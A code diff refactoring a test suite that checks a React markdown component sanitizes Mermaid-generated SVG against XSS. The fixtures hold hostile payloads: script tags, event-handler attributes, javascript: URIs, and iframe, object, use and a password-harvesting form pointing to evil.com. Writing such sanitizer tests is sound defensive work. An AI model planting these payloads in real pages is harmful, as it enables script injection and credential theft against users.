@@ -112,219 +112,126 @@ describe('RenderedMarkdown', () => {
   describe('Mermaid XSS sanitization', () => {
     const MERMAID_BLOCK = '```mermaid\ngraph TD\n  A-->B\n```';
 
-    it('strips <script> tags from SVG output', async () => {
-      const maliciousSvg = '<svg><text>Diagram</text><script>alert("xss")</script></svg>';
-      mocks.mermaidRender.mockResolvedValue({ svg: maliciousSvg });
-
+    /** Render a mermaid block with the given SVG and return the diagram's innerHTML. */
+    async function renderMermaidSvg(svg: string): Promise<string> {
+      mocks.mermaidRender.mockResolvedValue({ svg });
       render(<RenderedMarkdown content={MERMAID_BLOCK} />);
-
+      let html = '';
       await waitFor(() => {
         const diagram = screen.getByTestId('mermaid-diagram');
         expect(diagram.innerHTML).not.toBe('');
-        expect(diagram.innerHTML).toContain('Diagram');
-        expect(diagram.innerHTML).not.toContain('<script>');
-        expect(diagram.innerHTML).not.toContain('alert');
+        html = diagram.innerHTML;
       });
+      return html;
+    }
+
+    it('strips <script> tags from SVG output', async () => {
+      const html = await renderMermaidSvg('<svg><text>Diagram</text><script>alert("xss")</script></svg>');
+      expect(html).toContain('Diagram');
+      expect(html).not.toContain('<script>');
+      expect(html).not.toContain('alert');
     });
 
     it('strips event handler attributes from SVG output', async () => {
-      const maliciousSvg = '<svg><rect onclick="alert(1)" onerror="alert(2)" width="100" height="100"/><text>Safe</text></svg>';
-      mocks.mermaidRender.mockResolvedValue({ svg: maliciousSvg });
-
-      render(<RenderedMarkdown content={MERMAID_BLOCK} />);
-
-      await waitFor(() => {
-        const diagram = screen.getByTestId('mermaid-diagram');
-        expect(diagram.innerHTML).not.toBe('');
-        expect(diagram.innerHTML).toContain('Safe');
-        expect(diagram.innerHTML).not.toContain('onclick');
-        expect(diagram.innerHTML).not.toContain('onerror');
-        expect(diagram.innerHTML).not.toContain('alert');
-      });
+      const html = await renderMermaidSvg('<svg><rect onclick="alert(1)" onerror="alert(2)" width="100" height="100"/><text>Safe</text></svg>');
+      expect(html).toContain('Safe');
+      expect(html).not.toContain('onclick');
+      expect(html).not.toContain('onerror');
+      expect(html).not.toContain('alert');
     });
 
     it('strips javascript: URIs from SVG output', async () => {
-      const maliciousSvg = '<svg><a href="javascript:alert(1)"><text>Click me</text></a></svg>';
-      mocks.mermaidRender.mockResolvedValue({ svg: maliciousSvg });
-
-      render(<RenderedMarkdown content={MERMAID_BLOCK} />);
-
-      await waitFor(() => {
-        const diagram = screen.getByTestId('mermaid-diagram');
-        expect(diagram.innerHTML).not.toBe('');
-        expect(diagram.innerHTML).toContain('Click me');
-        expect(diagram.innerHTML).not.toContain('javascript:');
-      });
+      const html = await renderMermaidSvg('<svg><a href="javascript:alert(1)"><text>Click me</text></a></svg>');
+      expect(html).toContain('Click me');
+      expect(html).not.toContain('javascript:');
     });
 
     it('strips <use> elements with external references', async () => {
-      const maliciousSvg = '<svg><use href="http://evil.com/evil.svg#xss"/><text>Safe</text></svg>';
-      mocks.mermaidRender.mockResolvedValue({ svg: maliciousSvg });
-
-      render(<RenderedMarkdown content={MERMAID_BLOCK} />);
-
-      await waitFor(() => {
-        const diagram = screen.getByTestId('mermaid-diagram');
-        expect(diagram.innerHTML).not.toBe('');
-        expect(diagram.innerHTML).toContain('Safe');
-        expect(diagram.innerHTML).not.toContain('evil.com');
-      });
+      const html = await renderMermaidSvg('<svg><use href="http://evil.com/evil.svg#xss"/><text>Safe</text></svg>');
+      expect(html).toContain('Safe');
+      expect(html).not.toContain('evil.com');
     });
 
     it('preserves foreignObject with safe Mermaid label content', async () => {
-      const mermaidFlowchartSvg = '<svg><foreignObject width="100" height="40"><div xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Node A</span></div></foreignObject></svg>';
-      mocks.mermaidRender.mockResolvedValue({ svg: mermaidFlowchartSvg });
-
-      render(<RenderedMarkdown content={MERMAID_BLOCK} />);
-
-      await waitFor(() => {
-        const diagram = screen.getByTestId('mermaid-diagram');
-        expect(diagram.innerHTML).toContain('Node A');
-        expect(diagram.innerHTML).toContain('foreignObject');
-        expect(diagram.innerHTML).toContain('nodeLabel');
-      });
+      const html = await renderMermaidSvg(
+        '<svg><foreignObject width="100" height="40"><div xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Node A</span></div></foreignObject></svg>',
+      );
+      expect(html).toContain('Node A');
+      expect(html).toContain('foreignObject');
+      expect(html).toContain('nodeLabel');
     });
 
-    it('strips dangerous HTML inside foreignObject', async () => {
-      const maliciousSvg = '<svg><foreignObject><div><img src="x" onerror="alert(1)"/><script>alert(2)</script><span>Safe Label</span></div></foreignObject></svg>';
-      mocks.mermaidRender.mockResolvedValue({ svg: maliciousSvg });
-
-      render(<RenderedMarkdown content={MERMAID_BLOCK} />);
-
-      await waitFor(() => {
-        const diagram = screen.getByTestId('mermaid-diagram');
-        expect(diagram.innerHTML).not.toBe('');
-        expect(diagram.innerHTML).toContain('Safe Label');
-        expect(diagram.innerHTML).toContain('foreignObject');
-        expect(diagram.innerHTML).not.toContain('<img');
-        expect(diagram.innerHTML).not.toContain('onerror');
-        expect(diagram.innerHTML).not.toContain('<script');
-        expect(diagram.innerHTML).not.toContain('alert');
-      });
+    it('strips dangerous HTML inside foreignObject (img+onerror, script)', async () => {
+      const html = await renderMermaidSvg(
+        '<svg><foreignObject><div><img src="x" onerror="alert(1)"/><script>alert(2)</script><span>Safe Label</span></div></foreignObject></svg>',
+      );
+      expect(html).toContain('Safe Label');
+      expect(html).toContain('foreignObject');
+      expect(html).not.toContain('<img');
+      expect(html).not.toContain('onerror');
+      expect(html).not.toContain('<script');
+      expect(html).not.toContain('alert');
     });
 
     it('strips iframe and object elements inside foreignObject', async () => {
-      // iframe and object are the highest-severity blocked elements in the
-      // HTML subtree that foreignObject enables. The security comment in
-      // SVG_SANITIZE_CONFIG explicitly lists them as stripped by DOMPurify.
-      const maliciousSvg = [
-        '<svg><foreignObject>',
-        '<div>',
-        '<iframe src="https://evil.com/"></iframe>',
-        '<object data="https://evil.com/evil.swf"></object>',
-        '<span>Safe content</span>',
-        '</div>',
-        '</foreignObject></svg>',
-      ].join('');
-      mocks.mermaidRender.mockResolvedValue({ svg: maliciousSvg });
-
-      render(<RenderedMarkdown content={MERMAID_BLOCK} />);
-
-      await waitFor(() => {
-        const diagram = screen.getByTestId('mermaid-diagram');
-        expect(diagram.innerHTML).toContain('Safe content');
-        expect(diagram.innerHTML).toContain('foreignObject');
-        expect(diagram.innerHTML).not.toContain('<iframe');
-        expect(diagram.innerHTML).not.toContain('<object');
-        expect(diagram.innerHTML).not.toContain('evil.com');
-      });
+      const html = await renderMermaidSvg(
+        '<svg><foreignObject><div><iframe src="https://evil.com/"></iframe><object data="https://evil.com/evil.swf"></object><span>Safe content</span></div></foreignObject></svg>',
+      );
+      expect(html).toContain('Safe content');
+      expect(html).toContain('foreignObject');
+      expect(html).not.toContain('<iframe');
+      expect(html).not.toContain('<object');
+      expect(html).not.toContain('evil.com');
     });
 
     it('strips form and input elements inside foreignObject', async () => {
-      // form/input inside foreignObject could be used for credential harvesting
-      // via phishing overlays. Verified blocked by ADD_TAGS omission.
-      const maliciousSvg = [
-        '<svg><foreignObject>',
-        '<div>',
-        '<form action="https://evil.com/harvest"><input type="password" name="pw"/></form>',
-        '<span>Node Label</span>',
-        '</div>',
-        '</foreignObject></svg>',
-      ].join('');
-      mocks.mermaidRender.mockResolvedValue({ svg: maliciousSvg });
-
-      render(<RenderedMarkdown content={MERMAID_BLOCK} />);
-
-      await waitFor(() => {
-        const diagram = screen.getByTestId('mermaid-diagram');
-        expect(diagram.innerHTML).toContain('Node Label');
-        expect(diagram.innerHTML).not.toContain('<form');
-        expect(diagram.innerHTML).not.toContain('<input');
-        expect(diagram.innerHTML).not.toContain('evil.com');
-      });
+      const html = await renderMermaidSvg(
+        '<svg><foreignObject><div><form action="https://evil.com/harvest"><input type="password" name="pw"/></form><span>Node Label</span></div></foreignObject></svg>',
+      );
+      expect(html).toContain('Node Label');
+      expect(html).not.toContain('<form');
+      expect(html).not.toContain('<input');
+      expect(html).not.toContain('evil.com');
     });
 
     it('preserves multiple foreignObject elements in one SVG (multi-node flowchart)', async () => {
-      // A real Mermaid flowchart with N nodes produces N foreignObject elements.
-      // Verify that sanitization preserves all of them, not just the first.
-      const multiNodeSvg = [
+      const html = await renderMermaidSvg([
         '<svg>',
         '<foreignObject width="100" height="40"><div xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Node A</span></div></foreignObject>',
         '<foreignObject width="100" height="40"><div xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Node B</span></div></foreignObject>',
         '<foreignObject width="100" height="40"><div xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Node C</span></div></foreignObject>',
         '</svg>',
-      ].join('');
-      mocks.mermaidRender.mockResolvedValue({ svg: multiNodeSvg });
-
-      render(<RenderedMarkdown content={MERMAID_BLOCK} />);
-
-      await waitFor(() => {
-        const diagram = screen.getByTestId('mermaid-diagram');
-        expect(diagram.innerHTML).toContain('Node A');
-        expect(diagram.innerHTML).toContain('Node B');
-        expect(diagram.innerHTML).toContain('Node C');
-        // All three foreignObject containers must be present
-        const matches = diagram.innerHTML.match(/foreignObject/gi) ?? [];
-        // Each foreignObject has an open and close tag → 6 occurrences for 3 elements
-        expect(matches.length).toBeGreaterThanOrEqual(3);
-      });
+      ].join(''));
+      expect(html).toContain('Node A');
+      expect(html).toContain('Node B');
+      expect(html).toContain('Node C');
+      expect((html.match(/foreignObject/gi) ?? []).length).toBeGreaterThanOrEqual(3);
     });
 
     it('strips nested foreignObject elements', async () => {
-      // Nested foreignObject is invalid per the SVG spec but may appear in
-      // attacker-crafted SVG. DOMPurify should remove the inner element.
-      const nestedSvg = [
-        '<svg>',
-        '<foreignObject width="100" height="40">',
-        '<div xmlns="http://www.w3.org/1999/xhtml">',
-        '<span>Outer label</span>',
+      const html = await renderMermaidSvg([
+        '<svg><foreignObject width="100" height="40">',
+        '<div xmlns="http://www.w3.org/1999/xhtml"><span>Outer label</span>',
         '<foreignObject width="50" height="20"><div><script>alert(1)</script></div></foreignObject>',
-        '</div>',
-        '</foreignObject>',
-        '</svg>',
-      ].join('');
-      mocks.mermaidRender.mockResolvedValue({ svg: nestedSvg });
-
-      render(<RenderedMarkdown content={MERMAID_BLOCK} />);
-
-      await waitFor(() => {
-        const diagram = screen.getByTestId('mermaid-diagram');
-        expect(diagram.innerHTML).toContain('Outer label');
-        expect(diagram.innerHTML).not.toContain('<script');
-        expect(diagram.innerHTML).not.toContain('alert');
-      });
+        '</div></foreignObject></svg>',
+      ].join(''));
+      expect(html).toContain('Outer label');
+      expect(html).not.toContain('<script');
+      expect(html).not.toContain('alert');
     });
 
     it('preserves valid SVG content through sanitization', async () => {
-      const validSvg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect x="10" y="10" width="80" height="80" fill="#1a3a32" stroke="#29423b"/><text x="50" y="55" text-anchor="middle" fill="#e6f2ee">Node A</text></svg>';
-      mocks.mermaidRender.mockResolvedValue({ svg: validSvg });
-
-      render(<RenderedMarkdown content={MERMAID_BLOCK} />);
-
-      await waitFor(() => {
-        const diagram = screen.getByTestId('mermaid-diagram');
-        expect(diagram.innerHTML).not.toBe('');
-        expect(diagram.innerHTML).toContain('Node A');
-        expect(diagram.innerHTML).toContain('<rect');
-        expect(diagram.innerHTML).toContain('<text');
-        expect(diagram.innerHTML).toContain('fill="#1a3a32"');
-      });
+      const html = await renderMermaidSvg(
+        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect x="10" y="10" width="80" height="80" fill="#1a3a32" stroke="#29423b"/><text x="50" y="55" text-anchor="middle" fill="#e6f2ee">Node A</text></svg>',
+      );
+      expect(html).toContain('Node A');
+      expect(html).toContain('<rect');
+      expect(html).toContain('<text');
+      expect(html).toContain('fill="#1a3a32"');
     });
 
     it('preserves sequence diagram SVG using text elements (no foreignObject)', async () => {
-      // Sequence diagrams use <text> elements directly, not foreignObject.
-      // Verify the ADD_TAGS/HTML_INTEGRATION_POINTS changes do not regress them.
-      const sequenceSvg = [
+      const html = await renderMermaidSvg([
         '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 300">',
         '<rect x="50" y="10" width="120" height="40" fill="#1a3a32" stroke="#29423b"/>',
         '<text x="110" y="35" text-anchor="middle" fill="#e6f2ee">Alice</text>',
@@ -333,19 +240,12 @@ describe('RenderedMarkdown', () => {
         '<line x1="110" y1="50" x2="310" y2="80" stroke="#9fb7ae"/>',
         '<text x="210" y="70" text-anchor="middle" fill="#e6f2ee">Hello</text>',
         '</svg>',
-      ].join('');
-      mocks.mermaidRender.mockResolvedValue({ svg: sequenceSvg });
-
-      render(<RenderedMarkdown content={MERMAID_BLOCK} />);
-
-      await waitFor(() => {
-        const diagram = screen.getByTestId('mermaid-diagram');
-        expect(diagram.innerHTML).toContain('Alice');
-        expect(diagram.innerHTML).toContain('Bob');
-        expect(diagram.innerHTML).toContain('Hello');
-        expect(diagram.innerHTML).toContain('<text');
-        expect(diagram.innerHTML).toContain('<line');
-      });
+      ].join(''));
+      expect(html).toContain('Alice');
+      expect(html).toContain('Bob');
+      expect(html).toContain('Hello');
+      expect(html).toContain('<text');
+      expect(html).toContain('<line');
     });
 
     it('uses explicit ALLOWED_TAGS, ADD_TAGS, and ALLOWED_ATTR in SVG sanitize config', () => {
